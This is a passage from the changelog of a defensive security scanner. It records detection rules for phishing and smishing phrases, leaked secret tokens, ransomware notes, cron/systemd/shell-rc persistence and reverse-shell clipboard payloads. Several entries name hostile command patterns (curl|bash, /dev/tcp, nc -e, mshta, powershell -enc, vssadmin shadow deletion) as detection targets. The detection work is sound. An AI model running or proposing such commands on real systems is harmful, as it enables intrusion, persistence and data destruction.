  (GAP-SECRETS-EXPAND3): Added `dop_v1_` (DigitalOcean PAT), `ATATT` prefix
  (Atlassian/Jira/Confluence API token), `ops_v` (1Password service account
  token) to SECRET_PATTERNS. All three now ISOLATE(85) on bare token exposure.
- **Paste: P10 persistence injection** (GAP-PASTE-PERSIST): New P10 check
  detects SSH authorized_keys append, crontab persistence injection, and shell
  startup-file backdoor injection in clipboard payloads. Scores +50 (ALERT to
  ISOLATE when combined with other signals). FP guard: legitimate `ssh-copy-id`
  stays OK(0).
- **Protect: 2024-2025 ransomware note filenames** (GAP-PROTECT-RANSOM):
  Added ALPHV/BlackCat (`alphv_note.txt`, `blackcat_note.txt`), LockBit 3.0
  (`lockbit-readme.txt`), Nitrogen, Arkana, BEAST, SafePay, Play note filenames
  to RANSOM_NOTE_NAMES.

### Changed
- Version bumped from 0.9.94 to 0.9.95.

## [0.9.94] — 2026-06-13

### Security
- **Audit: A8 systemd user-unit persistence check** (GAP-AUDIT-A8):
  Scans `$HOME/.config/systemd/user/` for `.service`, `.timer`, and `.socket`
  unit files whose `ExecStart`/`ExecStartPre`/`ExecStop` lines contain the
  same dangerous patterns already guarded in A4 cron (`curl|bash`, `wget`,
  `base64 -d`, `/dev/tcp/`, `nc -e`, etc.). Attackers plant user-level
  systemd units to achieve login-persistent backdoors without root. Uses
  `O_NOFOLLOW|O_NONBLOCK` + `S_ISREG` guard (same pattern as A4) to prevent
  FIFO-block or symlink-redirect during the scan. Wired into `hlse_audit_all`.
  Header and file-level comment updated to document A6-A8.
- **URL: add chatgpt and gemini to BRANDS** (GAP-URL-AI-BRANDS):
  `chatgpt-login-verify.com` scored LOG(35); it now scores BLOCK(70).
  `chatgpt.com.free-upgrade.net` now scores BLOCK(65) via subdomain spoof.
  Legit `chatgpt.com` and `chat.openai.com` stay OK(0).
- **File: add .xll, .wll, .chm, .rdp, .sct, .job to EXECUTABLE_EXTS**
  (GAP-FILE-EXT): Excel/Word add-ins (shellcode delivery), Compiled HTML
  Help (hhctrl.ocx JScript), Remote Desktop files (auto-connect exploit),
  Windows Script Component, and Task Scheduler jobs. Double-extension
  masquerades (e.g. `invoice.pdf.rdp`) now score ISOLATE(85).
- **Text: MFA push-bombing, IT helpdesk impersonation, OTP relay**
  (GAP-TEXT-MFA): Added MFA fatigue phrases (`approve the notification`,
  `approve the sign-in request`, `just approve it`) to FAKE_ALERT_WORDS,
  IT helpdesk/department impersonation phrases (`this is your IT helpdesk`,
  `from IT security`, `corporate IT team`) to AUTHORITY_WORDS, and OTP
  relay phrases (`read me the code`, `tell me the code sent to you`) to
  FAKE_ALERT_WORDS. New `authority + bait` amplifier escalates IT-helpdesk +
  credential-harvest combinations from LOG(37) to ALERT(57). 2 CLI tests
  added (94 → 96).

### Changed
- Version bumped from 0.9.93 to 0.9.94.
- CLI integration tests: 94 → 96.

## [0.9.93] — 2026-06-11

### Security
- **Text: ClickFix / fake-CAPTCHA "paste-and-run" detection** (GAP-TEXT-CLICKFIX):
  Added a dedicated `ClickFix paste-and-run` signal targeting the top
  2024-2025 initial-access vector, where a fake "verify you are human" page
  tells the victim to press Win+R, paste an attacker-supplied PowerShell/mshta
  command, and press Enter. Signal matches high-specificity paste-execute
  instructions and living-off-the-land payload markers (`powershell -enc`,
  `mshta`, `invoke-expression`, `iex(`, `certutil -urlcache`). Amplifiers
  escalate to BLOCK/ISOLATE when combined with fake-CAPTCHA framing or a
  run-dialog invocation. Run-dialog phrases (Win+R) are intentionally kept
  out of the base signal — they are dual-use, so a legitimate IT instruction
  ("press Win+R, type cmd") stays OK while the paste-execute variant is
  flagged. Two CLI integration tests lock in both the detection and the
  FP guard.
- **Secrets: HashiCorp + AI + observability tokens** (GAP-SECRETS-EXPAND2):
  Added `VAULT_TOKEN`, `CONSUL_HTTP_TOKEN`, `NOMAD_TOKEN`, `BOUNDARY_TOKEN`
  (HashiCorp secrets management/orchestration), `GEMINI_API_KEY`,
  `GOOGLE_GEMINI_API_KEY`, `OPENROUTER_API_KEY`, `VERTEX_AI_KEY` (AI
  providers), and `PAGERDUTY_API_KEY`, `PAGERDUTY_TOKEN`, `OPSGENIE_API_KEY`,
  `GRAFANA_API_KEY` (incident/observability) to the ENV_SECRET watchlist.
- **URL: crypto-wallet brands + airdrop scam term** (GAP-URL-WEB3):
  Added `trezor`, `trustwallet`, `opensea`, `uniswap`, `pancakeswap`,
  `blockchain` to BRANDS (wallet-draining/seed-phrase phishing targets) and
  `airdrop` to SECURITY_WORDS. `airdrop` is overwhelmingly scam-correlated
  and near-absent from benign hyphenated registrable domains; generic terms
  like `wallet` were intentionally omitted to avoid FPs on legitimate
  `crypto-wallet-news.com`-style domains.
- **Supply: web3/crypto package watchlists** (GAP-SUPPLY-WEB3):
  Added `ethers`, `web3`, `wagmi`, `viem`, `hardhat`, `@solana/web3.js`,
  `@walletconnect/client`, `web3modal` (npm) and `web3`, `eth-account`,
  `eth-utils`, `web3py`, `solana`, `bitcoinlib` (pip). Wallet-drainer malware
  routinely ships as typosquats of these packages.
- **Text: toll-road / DMV smishing detection** (GAP-TEXT-TOLL):
  Added the FBI IC3 top-volume 2024-2025 smishing cluster (E-ZPass / FasTrak
  / SunPass / The Toll Roads impersonation: `unpaid toll`, `outstanding
  toll`, `toll balance`, `e-zpass`, `fastrak`, `sunpass`, `the toll roads`,
  …) and the 2025 DMV/registration successor wave (`registration will be
  suspended`, `dmv final notice`, `unpaid traffic ticket`) to the
  Callback/TOAD/smishing signal. Previously an E-ZPass lure scored OK(0);
  it now reaches ALERT(58), and a full toll lure with a payment URL reaches
  BLOCK(71). A single benign toll-brand mention stays at LOG(15) — it only
  escalates when combined with the urgency/payment/URL scam signature, so
  legitimate account messages are not flagged.

### Changed
- Version bumped from 0.9.92 to 0.9.93.
- CLI integration tests: 90 → 94 (ClickFix detection + FP guard, toll
  smishing detection + FP guard).

## [0.9.92] — 2026-06-10

### Security
- **URL: Trusted hosts expansion** (GAP-URL-TRUSTEDHOSTS):
  Added `microsoftonline.com`, `microsoft365.com`, `icloud.com` to TRUSTED_HOSTS.
  These legitimate Microsoft/Apple auth endpoints were scoring LOG(15) due to
  `/oauth` and `/signin` path patterns; now suppressed as expected.

- **URL: microsoftonline typosquat detection** (GAP-URL-MSONLINE):
  Added `microsoftonline` to BRANDS. `microsoft0nline.com` / `microsofton1ine.com`
  are now caught by the homoglyph and typosquat detectors at BLOCK(60+).

- **URL: Hyphenated subdomain spoof detection** (GAP-URL-SUBSPOOF):
  Extended `detect_subdomain_spoof()` to match brand names as hyphen-delimited
  tokens within subdomain labels. Previously `paypal-verify.login.net` and
  `microsoft365-sso.login.net` escaped detection; now both score ALERT(50).

- **Supply: Cargo ML/crypto crate watchlist expansion** (GAP-SUPPLY-CARGO):
  Added ML inference crates: `candle-core`, `candle-nn`, `candle-transformers`,
  `burn`, `burn-core`, `burn-tensor`, `ort`, `ndarray`, `linfa`.
  Added PKI/crypto crates: `rcgen`, `webpki`, `x509-parser`, `p256`,
  `ed25519-dalek`, `chacha20poly1305`, `argon2`, `pbkdf2`.

- **Supply: npm utility package watchlist expansion** (GAP-SUPPLY-NPM):
  Added `semver`, `minimist`, `node-fetch`, `cross-fetch`, `node-cache`,
  `winston`, `morgan`, `multer`, `socket.io-client`, `ws`, `got`, `supertest`,
  `aws-cdk`, `serverless`, `netlify-cli`, `vercel` — high-download packages
  absent from watchlist but targeted in active typosquat campaigns.

- **Protection: 2025 ransomware families** (GAP-PROTECT-RW2025B):
  Added extensions: `.hellcat`, `.blacklock`, `.eldorado`, `.apt73`.
  Added note filenames: `hellcat_readme.txt`, `blacklock_readme.txt`, `eldorado_readme.txt`.

- **Secrets: AI provider token patterns** (GAP-SECRET-AIPROVIDERS):
  Added explicit ENV_SECRET patterns for `GROQ_API_KEY`, `PERPLEXITY_API_KEY`,
  `DEEPSEEK_API_KEY`, `XAI_API_KEY`, `FIREWORKS_API_KEY`, `ANYSCALE_API_KEY`.

- **Text: Tech-support scam detection improvement** (GAP-TEXT-TECHSUPPORT):
  Added FAKE_ALERT_WORDS: "your computer has been infected", "your device has been
  infected", "at 1-800-", "at 1-888-", "at 1-877-" etc. — catches tech-support
  pop-up scam templates where toll-free number follows "contact us at" rather
  than "call".

- **Text: Investment/pig-butchering word-order variants** (GAP-TEXT-INVEST):
  Added GROOMING_WORDS: "returns guaranteed", "profits guaranteed", "100% safe",
  "100% guaranteed", "zero risk", "earn per week", "earn per day", "earn daily",
  "passive income guaranteed", "passive earning" — scam templates reverse
  "guaranteed returns" to evade naive pattern matching.

- **Text: Sign-in variant and customs duty detection** (GAP-TEXT-SIGNIN):
  Added FAKE_ALERT_WORDS: "unusual sign-in detected", "suspicious sign-in detected",
  "sign-in attempt detected", "login attempt detected".
  Added CALLBACK_PHISH_WORDS: "customs duty", "import duty" (USPS/FedEx smishing).

- **Text: Fake-order callback phrase gaps** (GAP-TEXT-FAKEORDER):
  Added FAKE_ALERT_WORDS: "if you did not place this order", "if you didn't place
  this order", "charge you did not authorize", "charge you did not make" —
  covers callback phishing TOAD templates that phrase fake-charge alerts
  differently from existing patterns.

### Changed
- Version bumped from 0.9.91 to 0.9.92.
- All 421 unit + CLI tests pass; zero warnings under strict flags.

## [0.9.91] — 2026-06-10

### Security
- **URL: Add malware delivery path patterns** (GAP-URL-MALWARE-PATHS):
  Added `/setup`, `/installer`, `/update.exe`, `/setup.exe` to PATH_PATTERNS.
  Combined with a suspicious TLD these push suspicious domains to ALERT tier.
  Example: `evil.xyz/download/update.exe` → ALERT(43).
  Trusted hosts (github.com, etc.) are unaffected by the O_NOFOLLOW guard.

- **Supply: Add Azure SDK packages to PIP_TOP watchlist** (GAP-SUPPLY-AZURE):
  Added `azure-core`, `azure-storage-blob`, `azure-identity`,
  `azure-keyvault-secrets`, `azure-mgmt-core` — high-value enterprise targets
  with documented typosquat campaigns (e.g. `azure-corr`, `azure-identty`).
  Also added `sentry-sdk`, `opentelemetry-api` (active typosquat campaigns).

- **Text: Add domain-expiry extortion scam patterns** (GAP-TEXT-DOMAINEXPIRY):
  Added URGENCY_WORDS: `final notice`, `last notice`,
  `domain will expire`, `domain expires`, `domain expiration`,
  `website will be taken down`, `hosting will be suspended`.
  These cover fake domain-expiry extortion scams that demand payment or
  account-recovery action under artificial time pressure.
  Test: "Final notice: your domain will expire in 24 hours." → LOG(24).

### Changed
- Version bumped from 0.9.90 to 0.9.91.
- All 421 unit + CLI tests pass; zero warnings under strict flags.

## [0.9.90] — 2026-06-10

### Security
- **File: Add macro-enabled Office and macOS pkg to executable extension list** (GAP-FILE-MACRODOC):
  `.docm`, `.xlsm`, `.pptm`, `.xlam`, `.ppam`, `.xlsb` (macro-enabled Office) and
  `.pkg`, `.mpkg` (macOS installer) were not in EXECUTABLE_EXTS. They now score
  SAFE(5) for extension alone and participate in lure-word detection. Examples:
  `hr_policy_2024.docm` → ALERT(45), `chrome_update.pkg` → ALERT(45).
  Added lure words: `readme`, `report`, `notification`, `policy`, `hr`, `compliance`,
  `legal`, `notice` — catching `README_important.exe` → ALERT(45).

- **Secrets: Add 22 missing ENV_SECRET patterns** (GAP-SECRET-ENVVARS):
  Added: Azure Storage connection string / account key / Cognitive / OpenAI key;
  Google API key, GCP API key, Firebase API key, Google Maps API key;
  S3 access/secret key variants; Notion token, Airtable PAT, Jira cloud token,
  Zendesk API token, Intercom access token, HubSpot API key,
  Salesforce access token; Mapbox access token, HERE API key;
  Twilio API key, Vonage API secret.

## [0.9.89] — 2026-06-10

### Security
- **Email E1: Fix brand-department display-name false positives** (BUG-EMAIL-E1-BRANDDEPT):
  The E1 display-name check used a flat keyword list that included generic role words
  ("support", "security", "admin", "helpdesk") alongside brand names. This caused
  "Apple Support" from apple.com, "Twitter Security" from twitter.com, and
  "Apple" from icloud.com to all score BLOCK(65) — false positives. Two fixes:
  (1) Added `brand_owns_domain(brand, domain)` with suffix-based matching (not substring)
  and a trusted-alternate-domain table (Apple→icloud.com/me.com, Amazon→amazonses.com,
  Facebook→facebookmail.com, Twitter→twitteremail.com/x.com, etc.). Uses "ends with"
  semantics so `accountprotection.microsoft.com` is trusted but `microsoft-verify.ru`
  is NOT.
  (2) Added `is_generic_display_role()` to suppress generic functional words when
  the primary brand already owns the From domain. Malicious senders (apple-verify.ru,
  microsoft-support.info) still trigger BLOCK(65). Added 3 regression tests.
  Secrets tests: 52 → 55.

## [0.9.88] — 2026-06-10

### Security
- **Text: Detect subscription-expiry and tech-support refund scam patterns** (GAP-TEXT-SUBSCRIP):
  Added URGENCY_WORDS: `click here to renew`, `account will be cancelled`,
  `will be automatically cancelled`, `membership expires in`, `membership will expire`,
  `subscription will expire`. Added BAIT_WORDS: `update your payment information`,
  `verify your payment information`, `confirm your payment information`,
  fake-charge indicators (`we have charged $`, `we have charged your`,
  `you have been charged for`, `charged to your account`, `we have debited your`,
  `auto-renewal charge`, `automatic renewal charge`).
  Amazon Prime/Netflix/domain-expiry phishing now scores LOG (was OK(0));
  tech-support refund scam ("We have charged $399, call to cancel") rises to BLOCK(67)
  (was ALERT(55)).  Zero FPs on legitimate charge confirmations and registrar emails.

## [0.9.87] — 2026-06-10

### Security
- **Core: Extend cp_fold() with Armenian and additional Greek/Cyrillic confusables** (GAP-URL-ARMENIAN):
  `cp_fold()` had no entries for Armenian script (even though `cp_script()` already
  classified it as CONFUSABLE). Attacks using Armenian lookalikes — ա (`apple.com`),
  ո (`google.com`), ե, հ — scored only LOG/ALERT(25-40). Added U+0561→'a', U+0565→'e',
  U+0578→'o', U+0570→'h'. Also added Cyrillic Komi De U+0501→'d' (`ԁiscord.com`) and
  Greek chi/omega U+03C7→'x', U+03C9→'w' (`ωhatsapp.com`). All four classes now reach
  BLOCK(60) via brand matching. Added 4 regression tests.

### Changed
- **Supply: Add P9 reverse-shell tests** (TEST-SUPPLY-P9):
  The P9 pastejacking signal (reverse shells: `/dev/tcp`, `nc -e`, Python socket, socat)
  added in v0.9.85 had no dedicated test coverage. Added 4 test cases covering all P9
  detection paths. Supply tests: 30 → 34.

- **Audit: Extend SUSPICIOUS_CRON_PATTERNS** (GAP-AUDIT-CRON):
  Added `xterm -display` (X11 reverse shell) and `msfvenom`/`meterpreter`
  (Metasploit payload indicators) to the cron persistence pattern list.

## [0.9.86] — 2026-06-10

### Security
- **Core: Fix raw-UTF-8 homoglyph blind spot + DRY the confusable table** (BUG-URL-MIXEDSCRIPT):
  `detect_mixed_script` had its own limited inline byte-switch that only
  folded 2-byte Cyrillic (0xD0/0xD1 lead bytes). Greek omicron
  (`gοοgle.com`, 0xCE 0xBF) and other Cyrillic ranges (palochka `ӏ`,
  0xD3 0x8F) collapsed to `?`, so the brand never matched —
  `gοοgle.com` scored only LOG(25) and `paypaӏ.com` ALERT(40). Replaced
  the inline switch with a proper UTF-8 code-point decoder that reuses
  the shared `cp_fold()` table (also extended with в/м/н/т/б/г Cyrillic
  and ι/ν/κ/υ/Β/Ο Greek). `gοοgle.com` → BLOCK(60), `paypaӏ.com` →
  BLOCK(75); legit IDNs (münchen.de, café.fr) stay advisory-only.

- **Secrets: Fix E1 display-name substring false positives** (BUG-EMAIL-E1-FP):
  the email-forensics E1 check matched known-brand tokens as raw
  substrings of the display name — `"First Choice"` matched `irs`
  (f-**irs**-t) and `"Backups Team"` matched `ups`, raising bogus
  IRS/UPS impersonation alerts. Added `contains_word()` (whole-word match
  bounded by non-alphanumerics) on the display-name side; the domain side
  keeps substring matching so lookalike domains embedding the brand
  (paypa1-verify.com) still suppress the alert for the genuine brand.
  Real PayPal/UPS impersonation with a mismatched From still fires E1.

- **Text: Detect Microsoft/Google sign-in-activity phishing** (GAP-TEXT-SIGNIN):
  FAKE_ALERT_WORDS += "unusual/suspicious sign-in activity",
  "new sign-in detected", "your microsoft account", "your google account
  has been". Prevalent template ("We detected unusual sign-in activity…")
  was scoring 0.

- **Text: BEC gift-card, SSA impersonation, billing & subscription gaps**:
  URGENCY_WORDS += "account is on hold", subscription-cancellation
  variants; SECRECY_WORDS += "keep it secret"; AUTHORITY_WORDS +=
  "social security number has been suspended" and SSA variants;
  BAIT_WORDS += "update your payment details". Netflix billing-hold,
  CEO gift-card BEC, and SSA robocall templates now score in band.

- **Text: Wallet-draining, ISP, unauthorized-order, loan & job-scam patterns**:
  FAKE_ALERT_WORDS += crypto wallet-draining ("wallet has been
  compromised", "move your crypto to safety", "coinbase security alert"),
  ISP impersonation ("internet will be disconnected"), unauthorized-order
  fraud ("order you did not authorize", "call our fraud department").
  GROOMING_WORDS += work-from-home and no-credit-check loan fraud openers.

- **Supply: Add P9 reverse-shell detection to pastejacking checker**:
  bash `/dev/tcp` redirect, `mkfifo`+`nc` named-pipe, Python socket
  (`os.dup2`+`connect`), and `socat EXEC:`/`TCP:` reverse shells —
  previously unmatched by the Unix P1–P8 checks.

- **Secrets: MongoDB/connection-string and generic key patterns**:
  ENV_SECRET += `MONGO_URI=`/`MONGO_URL=`, `REDIS_URI=`, MySQL/Postgres/
  MariaDB/CockroachDB/Elasticsearch URLs, `SECRET_KEY_BASE=`, `APP_KEY=`,
  `ENCRYPTION_KEY=`, `MASTER_KEY=`, `SIGNING_SECRET=`. Removed a duplicate
  `SECRET_KEY=` entry.

- **Core: Fix security-word matching and add giveaway/cloud-hosting phishing**:
  SECURITY_WORDS += "security" (was missing — "secure" is not a substring
  of "security"), "verification", "recovery", and giveaway words
  ("free", "giveaway", "nitro", …); PATH_PATTERNS += "/seed", "/mnemonic",
  "/recovery-phrase"; FREE_HOSTS += azurewebsites.net, blob.core.windows.net,
  s3.amazonaws.com, storage.googleapis.com, workers.dev, … Brand-in-subdomain
  phishing on cloud dev hosts now flagged.

- **File: Detect OS/browser update dropper lure names**:
  LURE_WORDS += "windows", "chrome", "firefox", "adobe", "flash", "java",
  "system", "microsoft", "google". `windows_update.exe`,
  `adobe_flash_player.exe`, `chrome_installer.exe` now reach ALERT;
  document files stay clean (lure scoring escalates only with an
  executable extension).

- **Audit: Detect alias hijacking + expand shell-rc coverage**:
  A6 now flags `alias ls/ps/sudo/ssh/...=` whose target invokes
  curl/wget/dev-tcp/nc/eval/base64/grep-v/python/tmp (rootkit file-hiding,
  sudo credential theft). Scanned files += `.bash_logout`, `.zlogin`,
  `.zlogout`, `.config/fish/config.fish`.

- **Protect: Expand anti-recovery commands and UEFI bootkit indicators**:
  R5 += vssadmin/wbadmin/bcdedit/zfs/fsutil/wevtutil backup-destruction
  variants; ESP_INDICATORS += MosaicRegressor, FinSpy, TrickBoot, Glupteba.

### Tests
- 404 structured tests (was 400). Secrets suite 52 (was 50): added E1
  substring-FP regression ("First Choice") and E1 UPS-impersonation tests.
  URL unit suite 33 (was 31): added raw-UTF-8 Greek-omicron and
  Cyrillic-palochka homoglyph regressions.
- F1 = 1.000 on both corpora; ASan/UBSan clean; fuzz 100K, 0 crashes.

## [0.9.85] — 2026-06-10

### Security
- **Text: Fix authority impersonation FP — remove substring-prone acronyms** (BUG-TEXT-IRS-FP):
  `irs` matched "first" (f-**irs**-t), `cia` matched "judicial", etc.
  Replaced standalone 3-letter acronyms with context-bearing phrases:
  "from the irs", "irs agent", "irs notice", "irs investigation", etc.
  IRS impersonation still detected; pig-butchering with "first" no longer
  triggers false Authority hit.

- **Text: Improve BEC authority patterns and wire transfer detection**:
  AUTHORITY_WORDS: added "as the ceo/cfo", "i am the ceo/cfo",
  "on behalf of the ceo", "acting ceo/cfo".
  BAIT_WORDS: added "wire the payment", "wire this payment",
  "process the wire", "send the payment".
  Result: "As the CEO…wire the initial payment" → ALERT[50] (was 0).

- **Text: 2025 smishing and urgency patterns** (GAP-TEXT-CLICKBAIT):
  URGENCY_WORDS: +7 click-bait patterns (click here to verify/confirm).
  CALLBACK_PHISH_WORDS: +12 delivery/USPS smishing variants.

- **Util: Expand benign-magic whitelist to 31 formats** (GAP-UTIL-MAGIC):
  Added OTF/WOFF/WOFF2 fonts, Apache Arrow IPC, DER X.509 certificate,
  Snappy framing format. Prevents false-positive entropy alerts on
  legitimate web fonts and cloud-native data files.

- **File: Add .dll to EXECUTABLE_EXTS; expand LURE_WORDS** (GAP-FILE-DLL):
  .dll now detected in double-extension attacks (document.pdf.dll).
  +9 LURE_WORDS: driver, codec, plugin, proof, memo, hacked, breach, etc.

- **Audit: Expand DNS hosts-poisoning watchlist** (GAP-AUDIT-DNS):
  SENSITIVE_DOMAINS: +16 entries (brokerages, P2P payment, Apple iCloud,
  social/communication platforms, streaming services).

- **Protect: Add 2025 UEFI bootkit indicator strings** (GAP-PROTECT-ESP):
  ESP_INDICATORS: LoJax, MoonBounce, CosmicStrand, ESPectre.

### Tests
- URL unit: 28 → 31 (norton brand, turbotax, pages.dev/wp-admin)
- Text unit: 15 → 18 (BEC, IRS FP regression, smishing)
- Util: 33 → 36 (OTF, WOFF, DER cert)
- Total: 391 → 400 (**milestone: 400 structured tests**)

## [0.9.80] — 2026-06-10

### Security
- **Secrets: SendGrid, HashiCorp Vault batch/recovery, Vercel patterns** (GAP-SECRET-2025):
  Added `SG.` (SendGrid, +85), `hvb.` (Vault batch, +80), `hvr.` (Vault recovery, +80),
  `vercel_token_` (+80). Total patterns: 43 → 47.

- **Audit: A7 sudoers NOPASSWD check** (GAP-AUDIT-SUDOERS): New function
  `hlse_audit_sudoers()` scans `/etc/sudoers` and drop-ins in `/etc/sudoers.d/`
  for `NOPASSWD` entries (+40 HIGH per match). Integrated into `hlse_audit_all()`.
  `HLSE_AUDIT_MAX_FINDINGS` bumped 24 → 32 for 7 modules.

- **Audit: Cloud SDK credential file permissions** (GAP-AUDIT-HOMESECRETS):
  HOME_SECRETS expanded with GCP ADC (`~/.config/gcloud/application_default_credentials.json`),
  GitHub CLI (`~/.config/gh/hosts.yml`), Terraform Cloud (`~/.terraform.d/credentials.tfrc.json`),
  Azure CLI (`~/.azure/credentials`), Heroku (`~/.heroku/credentials.json`).

- **URL: Security software, tax, collaboration brands** (GAP-URL-BRANDS-2):
  BRANDS gains: norton, mcafee, kaspersky, bitdefender, avast, malwarebytes (fake-AV);
  intuit, turbotax, quickbooks (tax phishing); office365, microsoft365,
  microsoftteams (BEC); truist (banking).
  PATH_PATTERNS gains: /wp-admin, /wp-login, /administrator, /oauth, /sso,
  /saml, /forgot, /password-reset.

- **Text: 2024-2025 delivery smishing patterns** (GAP-TEXT-SMISHING):
  CALLBACK_PHISH_WORDS gains 12 USPS/courier smishing variants: "package has been held",
  "customs clearance fee", "pay a small fee", "delivery charge unpaid", etc.
  URGENCY_WORDS gains 7 click-bait variants: "click here to verify/confirm/update",
  "your account will be terminated", etc. Result: USPS smishing → LOG[35] (was 0).

- **Supply: 2025 LOLBin and ransomware** (GAP-SUPPLY-LOLBIN-2025):
  P8 gains: msiexec silent install, expand.exe download, curl/wget→executable.
  RANSOM_EXTENSIONS: +6 families (Cloak, VanHelsing, 3AM, Nitrogen, Arkana, BEAST).
  RANSOM_NOTE_NAMES: +3 (cloak, 3AM, VanHelsing readmes).

## [0.9.75] — 2026-06-09

### Security
- **Secrets: Render, Fly.io, CircleCI, Contentful token patterns** (GAP-SECRET-PATTERNS):
  Added 4 new CI/CD and cloud platform token patterns: `rnd_` (Render, +80),
  `FlyV1` (Fly.io, +85), `CCIPAT_` (CircleCI, +85), `CFPAT-` (Contentful, +85).
  Total patterns: 39 → 43.

- **URL: Government TLD (.gov/.mil/.edu) text-scan suppression** (GAP-URL-GOV-FP):
  `hlse_scan()` now skips the text compound-signal scan for registry-restricted
  TLDs (.gov, .mil, .edu). These TLDs cannot be registered by attackers, so
  authority-impersonation hits (e.g. "irs" in `irs.gov/refund`) were false
  positives. `irs.gov/refund`: ALERT[47] → LOG[15]. Phishing domains like
  `irs-refund-alert.com` still score ALERT[47].

- **URL: Brand/path/TLD expansion** (GAP-URL-BRANDS): Added brands: venmo, zelle,
  cashapp, payoneer, ups, crypto. Added PATH_PATTERNS: /2fa, /otp, /mfa, /kyc,
  /transfer, /wire. Added SUSPICIOUS_TLDS: .sbs, .fit.

- **Audit: SSH X11Forwarding, AllowTcpForwarding, LoginGraceTime checks** (GAP-AUDIT-SSH):
  SSH audit (A1) now detects X11Forwarding yes (+15), AllowTcpForwarding yes (+15),
  LoginGraceTime > 60 or unlimited (+5) — common lateral-movement enablers.

- **Audit: Shell RC PROMPT_COMMAND injection and function override detection** (GAP-AUDIT-SHELLRC):
  A6 shellrc scan now detects `PROMPT_COMMAND=` injection (+40, every-prompt
  payload) and system-command function overrides for ls/ps/top/netstat/etc. (+35).
  Classic rootkit persistence not previously covered.

### Added
- **File: 7-Zip, Cabinet, WebAssembly magic byte detection** (GAP-FILE-MAGIC):
  MAGIC_TABLE gains 7-Zip (6-byte header), Cabinet/MSCF (Windows dropper),
  WebAssembly (\0asm). F2 mismatch: WASM with non-.wasm → +55; Cabinet with
  non-.cab/.msi → +40. Both added to polyglot-with-executable-ext check (+50).

## [0.9.70] — 2026-06-09

### Security
- **URL: IPv6 literal host phishing detection** (GAP-URL-IPV6): The IP-based
  phishing detector (brand-in-path +35, auth-path +15) now also fires on IPv6
  literal hosts (`[2001:db8::1]/paypal/signin`). Previously only IPv4 dot-
  notation was handled. `http://[2001:db8::1]/paypal/signin` now scores ISOLATE
  vs. ALERT before.

## [0.9.69] — 2026-06-09

### Security
- **URL: @ credential trick explicit detection** (GAP-URL-AT): Added dedicated
  check for `@` in URL authority (`https://google.com@evil.com` pattern). Per
  RFC 3986 §3.2.1 the real host is after the @; browsers show the fake brand
  before it. Now scores +45 with a clear message. Self-test case added (25
  cases). Previously detected only indirectly via subdomain-spoof path.

## [0.9.68] — 2026-06-09

### Added
- **Secrets: IaC / CI/CD secret patterns** (GAP-SEC-IAC): Added to
  `env_passwords` watchlist: `TF_VAR_` (Terraform variables), `PULUMI_ACCESS_TOKEN`,
  `PULUMI_CONFIG_PASSPHRASE`, `ARM_CLIENT_SECRET` / `ARM_SUBSCRIPTION_ID`
  (Azure ARM), `GOOGLE_CREDENTIALS` / `GOOGLE_APPLICATION_CREDENTIALS` (GCP),
  `TF_TOKEN_app_terraform_io`, `ACTIONS_RUNTIME_TOKEN` / `ACTIONS_ID_TOKEN_REQUEST_TOKEN`
  (GitHub Actions). Covers IaC credential leakage common in misconfigured CI logs.

## [0.9.67] — 2026-06-09

### Security
- **Ransomware: R5 shadow-deletion scan implemented** (GAP-RS-R5): The R5
  check (`hlse_ransomware_check_shadow_deletion()`) was previously a stub.
  Now scans `/proc/<pid>/cmdline` (O_NOFOLLOW + O_NONBLOCK + S_ISREG guard)
  for vssadmin, wmic shadow, lvremove, bcdedit, wbadmin shadow-deletion
  commands running as live processes. Fires +60 (BLOCK) on detection.

## [0.9.66] — 2026-06-09

### Added
- **Text: emergency/grandparent scam detection** (GAP-TX-EMG): New signal
  `EMERGENCY_SCAM_WORDS` (15 EN + 7 JP phrases) covering the grandparent
  scam (jail/accident + bail + secrecy), lottery release-fee scams, and
  Japanese ore-ore fraud (振り込め詐欺). Base=20, per_hit=15, cap=45.
  Two compound amplifiers in Pass 2: emergency + secrecy → +25 (grandparent
  pattern); emergency + financial/urgency → +20 (bail fraud). Benign accident
  descriptions score SAFE. Grandparent scam text scores ISOLATE. JP ore-ore
  fraud detected via native phrases. P6 FP gate passes.

## [0.9.65] — 2026-06-09

### Added
- **Supply chain: Cargo package set +11** (GAP-SC-CARGO): Added tauri, leptos,
  dioxus, bevy, embassy (embedded), tokio-tungstenite, axum-core, tower-http,
  sea-orm, sea-query, dotenvy — high-growth 2024 crates that are active
  typosquat targets. Total packages: 229 → 240 (cargo=47 → 58).

## [0.9.64] — 2026-06-09

### Added
- **Secrets: GCP service account JSON detection** (GAP-SEC-GCP): Structural
  check for `"type": "service_account"` + `"private_key"` co-occurrence —
  a near-zero-FP pattern. Scores +90 (ISOLATE). Test added.
- **Secrets: Azure SAS token detection** (GAP-SEC-AZURE): Structural check for
  `SharedAccessSignature` or `sv=`+`sig=`+`se=` combination. Scores +85
  (ISOLATE). Test added. Total secrets tests: 44 → 46.
- **Text: pig-butchering / crypto-romance scam +14 phrases** (GAP-TX-PB):
  Added `"my mentor taught me"`, `"exclusive trading group"`, `"vip signal group"`,
  `"arbitrage opportunity"`, `"usdt income"`, `"deposit to start"`, etc. covering
  2024-2025 pig-butchering language evolution. JP phrases added.

## [0.9.63] — 2026-06-09

### Security
- **Text + URL: Cyrillic homoglyph map expanded +5** (GAP-HG): Added
  `н→n`, `т→t`, `м→m`, `к→k` (was in URL but not text), `в→v` to
  `normalize_homoglyphs()` in `hlse_text.c`. Synchronized `detect_mixed_script()`
  in `hlse_core.c` with same set (also adding `х→x`, `ј→j`, `т→t`). Covers
  additional visually-indistinguishable Cyrillic characters used in phishing
  domains and scam messages.

## [0.9.62] — 2026-06-09

### Added
- **Text: callback/TOAD/smishing/vishing detection** (GAP-TX-TOAD): New signal
  `CALLBACK_PHISH_WORDS` (17 EN + 6 JP phrases) covering telephone-oriented
  attack delivery (BazarCall, Google Groups callback phishing), SMS delivery-fee
  scams, and Japanese package delivery smishing. Base=15, per_hit=10, cap=30.
  Compound amplifier in Pass 2: callback + urgency/authority/bait → +20. Benign
  appointment reminders with "call us at" score LOG (25); urgent subscription
  scam with callback → ALERT (51+). P6 FP gate passes.

## [0.9.61] — 2026-06-09

### Added
- **Audit: SSH hardening checks +3** (GAP-SSH): `sshd_config` parser now
  detects `Protocol 1` (SSHv1, +40 HIGH), `MaxAuthTries > 3` (+10 LOW), and
  `PermitEmptyPasswords yes` (+50 HIGH). All are security anti-patterns that
  allow brute-force or no-credential access.
- **Network: safe DNS resolver list expanded** (GAP-DNS): Added Quad9 secondary
  (149.112.112.112), OpenDNS (208.67.x.x), Verisign (64.6.x.x), and
